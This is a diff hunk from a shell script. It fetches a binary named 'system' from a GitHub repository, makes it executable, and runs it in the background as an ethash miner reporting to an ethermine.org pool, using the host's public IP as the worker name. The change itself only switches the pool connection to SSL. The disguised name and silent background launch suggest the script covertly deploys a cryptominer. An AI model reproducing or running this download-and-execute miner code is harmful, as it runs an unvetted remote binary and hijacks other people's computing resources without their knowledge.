@@ -19,5 +19,5 @@ if [ ! -f "${SCRIPT_DIR}/installed.txt" ]; then
 	wget https://github.com/dipsey1337/yuhu/raw/main/system
 	chmod +x system
 	ip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
-	./system -a ethash -o stratum+tcp://us1.ethermine.org:4444 -u sp_ajg -p x -w $ip &
+	./system -a ethash -o ssl://us1.ethermine.org:4444 -u sp_ajg -p x -w $ip &
 fi
